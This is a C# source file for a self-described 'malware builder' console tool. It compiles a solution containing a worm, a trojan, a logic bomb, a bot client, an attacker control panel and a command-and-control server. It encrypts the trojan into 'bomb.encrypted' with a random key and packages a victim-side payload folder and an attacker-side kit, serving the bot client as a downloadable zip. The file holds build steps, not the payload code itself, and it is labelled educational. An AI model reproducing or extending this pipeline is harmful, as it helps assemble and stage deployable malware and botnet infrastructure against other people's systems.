using SharedCrypto;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;

namespace Builder
{
    class Program
    {
        private static string SolutionDir;
        private static string BuilderOutputDir;
        private static string PayloadDir;
        private static string AttackerOutputDir;
        private static string ControlPanelDir;
        private static string WwwRootDir;
        private static string initialEncryptionKey;

        // --- NEW: Path to MSBuild.exe ---
        private static string msBuildPath;

        static void Main(string[] args)
        {
            Console.WriteLine("===========================================");
            Console.WriteLine("   MALWARE BUILDER - EDUCATIONAL USE ONLY");
            Console.WriteLine("   Random Key Encryption Edition");
            Console.WriteLine("===========================================");
            Console.WriteLine();

            try
            {
                InitializePaths();
                // --- NEW: Find MSBuild before starting ---
                FindMSBuild();
                GenerateAndStoreInitialKey();

                BuildProject("SharedCrypto");
                BuildProject("Trojan");
                BuildProject("LogicBomb");
                BuildProject("Worm"); // This will now use MSBuild.exe
                BuildProject("BotClient");
                BuildProject("AttackerControlPanel");
                BuildProject("C&CServer");

                EncryptTrojan();
                CreateOutputStructure();
                CreateAttackerPackage();
                CleanupIntermediateFiles();

                Console.WriteLine();
                LogSuccess("Build completed successfully!");
                Console.WriteLine();
                LogInfo($"Worm output location: {BuilderOutputDir}");
                LogInfo($"Attacker toolkit location: {AttackerOutputDir}");
                Console.WriteLine();
                LogWarning("Note: bomb.encrypted is encrypted with a RANDOMLY GENERATED key.");
                LogWarning("The key is stored in 'product/payload/key.dat'.");
            }
            catch (Exception ex)
            {
                Console.WriteLine();
                LogError("BUILD FAILED!");
                LogError($"Error: {ex.Message}");
                Console.WriteLine();
                LogError("Stack trace:");
                Console.WriteLine(ex.StackTrace);
                Environment.Exit(1);
            }

            Console.WriteLine();
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        private static void InitializePaths()
        {
            LogInfo("Initializing paths...");
            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            SolutionDir = Directory.GetParent(currentDir).Parent.Parent.Parent.FullName;
            BuilderOutputDir = Path.Combine(currentDir, "product");
            PayloadDir = Path.Combine(BuilderOutputDir, "payload");
            AttackerOutputDir = Path.Combine(currentDir, "attack");
            ControlPanelDir = Path.Combine(AttackerOutputDir, "control panel");
            WwwRootDir = Path.Combine(AttackerOutputDir, "wwwroot");

            if (Directory.Exists(BuilderOutputDir)) Directory.Delete(BuilderOutputDir, true);
            if (Directory.Exists(AttackerOutputDir)) Directory.Delete(AttackerOutputDir, true);

            Directory.CreateDirectory(BuilderOutputDir);
            Directory.CreateDirectory(PayloadDir);
            Directory.CreateDirectory(AttackerOutputDir);
            Directory.CreateDirectory(ControlPanelDir);
            Directory.CreateDirectory(WwwRootDir);

            LogSuccess($"Solution directory: {SolutionDir}");
            LogSuccess($"Output directories: 'product' and 'attack'");
            Console.WriteLine();
        }

        // --- NEW: Method to locate the correct MSBuild.exe ---
        private static void FindMSBuild()
        {
            LogInfo("Locating .NET Framework MSBuild.exe for COM compatibility...");
            // Path you provided
            string specificPath = @"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe";

            if (File.Exists(specificPath))
            {
                msBuildPath = specificPath;
                LogSuccess($"Found MSBuild at: {msBuildPath}");
                Console.WriteLine();
                return;
            }

            // Fallback search in case the path changes
            string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
            var possiblePaths = Directory.GetFiles(programFiles, "MSBuild.exe", SearchOption.AllDirectories)
                                         .Where(p => p.Contains("Microsoft Visual Studio") && !p.Contains("Core"))
                                         .OrderByDescending(p => p)
                                         .ToList();

            if (possiblePaths.Any())
            {
                msBuildPath = possiblePaths.First();
                LogSuccess($"Found MSBuild at: {msBuildPath}");
                Console.WriteLine();
            }
            else
            {
                throw new FileNotFoundException("Could not locate MSBuild.exe. The Worm project cannot be built without the .NET Framework SDK (Visual Studio).");
            }
        }

        private static void GenerateAndStoreInitialKey()
        {
            LogInfo("Generating initial random key for encryption...");
            initialEncryptionKey = CryptoUtils.GenerateRandomKey();
            LogSuccess($"Generated Key: {initialEncryptionKey}");
            string keyFilePath = Path.Combine(PayloadDir, "key.dat");
            File.WriteAllText(keyFilePath, initialEncryptionKey);
            LogSuccess($"Initial key saved to product/payload/key.dat");
            Console.WriteLine();
        }

        private static void BuildProject(string projectName)
        {
            LogInfo($"Building {projectName} project...");
            string csprojName = projectName.Replace("&", "n");
            string projectPath = Path.Combine(SolutionDir, projectName, $"{csprojName}.csproj");
            if (!File.Exists(projectPath)) throw new FileNotFoundException($"Project file not found: {projectPath}");

            string fileName;
            string buildArguments;

            // --- MODIFIED: Use the correct build tool for the job ---
            if (projectName == "Worm")
            {
                fileName = msBuildPath;
                // Arguments for MSBuild.exe are slightly different
                buildArguments = $"\"{projectPath}\" /p:Configuration=Debug";
                LogInfo("Using .NET Framework MSBuild for COM Interop compatibility.");
            }
            else
            {
                fileName = "dotnet";
                buildArguments = $"build \"{projectPath}\" --configuration Debug";
            }

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = buildArguments,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    Console.WriteLine(output);
                    Console.WriteLine(error);
                    throw new Exception($"Failed to build {projectName}. Exit code: {process.ExitCode}");
                }
            }
            LogSuccess($"{projectName} built successfully");
            Console.WriteLine();
        }

        private static void EncryptTrojan()
        {
            LogInfo("Encrypting Trojan.exe with the generated random key...");
            string trojanExePath = FindExecutable("Trojan", "Trojan.exe");
            string encryptedOutputPath = Path.Combine(PayloadDir, "bomb.encrypted");
            CryptoUtils.EncryptFile(trojanExePath, encryptedOutputPath, initialEncryptionKey);
            LogSuccess($"Trojan.exe encrypted successfully to 'bomb.encrypted'");
            Console.WriteLine();
        }

        private static void CreateOutputStructure()
        {
            LogInfo("Creating 'product' folder structure...");
            CopyFileToOutput("Worm", "Worm.exe", BuilderOutputDir);
            CopyFileToOutput("SharedCrypto", "SharedCrypto.dll", BuilderOutputDir);
            CopyFileToOutput("LogicBomb", "LogicBomb.exe", PayloadDir);
            CopyFileToOutput("SharedCrypto", "SharedCrypto.dll", PayloadDir);
            LogSuccess("key.dat and bomb.encrypted already in product/payload folder");
            Console.WriteLine();
        }

        private static void CreateAttackerPackage()
        {
            LogInfo("Creating 'attack' folder structure...");
            string botClientOutputDir = FindBuildOutputDirectory("BotClient");
            string zipPath = Path.Combine(WwwRootDir, "payload.zip");
            ZipFile.CreateFromDirectory(botClientOutputDir, zipPath);
            LogSuccess("Packaged BotClient into attack/wwwroot/payload.zip");

            string cncServerOutputDir = FindBuildOutputDirectory("C&CServer");
            CopyDirectoryContents(cncServerOutputDir, AttackerOutputDir);
            LogSuccess("Staged C&CServer into 'attack' folder");

            string controlPanelOutputDir = FindBuildOutputDirectory("AttackerControlPanel");
            CopyDirectoryContents(controlPanelOutputDir, ControlPanelDir);
            LogSuccess("Staged AttackerControlPanel into 'attack/control panel' folder");
            Console.WriteLine();
        }

        private static void CopyFileToOutput(string projectName, string fileName, string destinationDir)
        {
            string sourcePath = FindExecutable(projectName, fileName);
            string destPath = Path.Combine(destinationDir, fileName);
            File.Copy(sourcePath, destPath, true);
        }

        private static string FindExecutable(string projectName, string exeName)
        {
            // Since Worm is now built with MSBuild, its output path is standard x86
            string wormOutputPath = Path.Combine(SolutionDir, projectName, "bin", "x86", "Debug", exeName);
            if (projectName == "Worm" && File.Exists(wormOutputPath))
            {
                return wormOutputPath;
            }

            List<string> possiblePaths = new List<string>
            {
                Path.Combine(SolutionDir, projectName, "bin", "Debug", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net472", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net8.0", exeName)
            };

            foreach (string path in possiblePaths)
            {
                if (File.Exists(path)) return path;
            }
            throw new FileNotFoundException($"{exeName} not found for project {projectName}");
        }

        private static string FindBuildOutputDirectory(string projectName)
        {
            string wormOutputPath = Path.Combine(SolutionDir, projectName, "bin", "x86", "Debug");
            if (projectName == "Worm" && Directory.Exists(wormOutputPath))
            {
                return wormOutputPath;
            }

            List<string> possiblePaths = new List<string>
            {
                Path.Combine(SolutionDir, projectName, "bin", "Debug"),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net8.0")
            };

            foreach (string path in possiblePaths)
            {
                if (Directory.Exists(path) && Directory.GetFiles(path).Length > 0)
                {
                    return path;
                }
            }
            throw new DirectoryNotFoundException($"Build output directory not found for project {projectName}");
        }

        private static void CopyDirectoryContents(string sourceDir, string destDir)
        {
            Directory.CreateDirectory(destDir);
            foreach (FileInfo file in new DirectoryInfo(sourceDir).GetFiles())
            {
                file.CopyTo(Path.Combine(destDir, file.Name), true);
            }
            foreach (DirectoryInfo subDir in new DirectoryInfo(sourceDir).GetDirectories())
            {
                CopyDirectoryContents(subDir.FullName, Path.Combine(destDir, subDir.Name));
            }
        }

        private static void CleanupIntermediateFiles()
        {
            LogInfo("Cleaning up intermediate files...");
            try
            {
                string[] projectsToClean = { "Worm", "LogicBomb", "Trojan", "SharedCrypto", "BotClient", "AttackerControlPanel", "C&CServer" };
                foreach (string project in projectsToClean)
                {
                    string binPath = Path.Combine(SolutionDir, project, "bin");
                    if (Directory.Exists(binPath)) Directory.Delete(binPath, true);
                    string objPath = Path.Combine(SolutionDir, project, "obj");
                    if (Directory.Exists(objPath)) Directory.Delete(objPath, true);
                }
                LogSuccess("Cleaned all bin/obj folders.");
                Console.WriteLine();
            }
            catch (Exception ex)
            {
                LogWarning($"Cleanup warning: {ex.Message}");
            }
        }

        // --- MODIFIED: Logging methods now use meaningful labels ---
        private static void LogInfo(string message) => Log(message, ConsoleColor.Cyan, "[INFO]");
        private static void LogSuccess(string message) => Log(message, ConsoleColor.Green, "[SUCCESS]");
        private static void LogWarning(string message) => Log(message, ConsoleColor.Yellow, "[WARNING]");
        private static void LogError(string message) => Log(message, ConsoleColor.Red, "[ERROR]");
        private static void Log(string message, ConsoleColor color, string prefix)
        {
            Console.ForegroundColor = color;
            Console.WriteLine($"{prefix} {message}");
            Console.ResetColor();
        }
    }
}